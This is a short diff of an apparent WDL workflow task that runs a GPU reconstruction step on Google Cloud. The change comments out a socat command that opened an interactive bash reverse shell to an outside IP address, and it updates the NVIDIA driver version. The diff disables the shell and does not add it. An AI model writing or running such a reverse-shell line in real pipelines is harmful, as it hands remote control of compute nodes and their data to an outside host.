@@ -42,7 +42,7 @@ task recon {
         gcloud storage cp blind_raw_reads_filtered.csv.gz blind_statistics_filtered.csv QC.pdf "$recon_output_path"
     fi
 
-    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:37.27.24.244:9001
+    # socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:37.27.24.244:9001
 
     # Run reconstruction_blind.py
     if [[ -f blind_raw_reads_filtered.csv.gz ]] ; then
@@ -79,7 +79,7 @@ task recon {
     preemptible: 1
     gpuType: "nvidia-tesla-v100"
     gpuCount: 1
-    nvidiaDriverVersion: "535.86.10"
+    nvidiaDriverVersion: "535.129.03"
     zones: "us-central1-a us-central1-b us-central1-c us-central1-f"
   }
 }
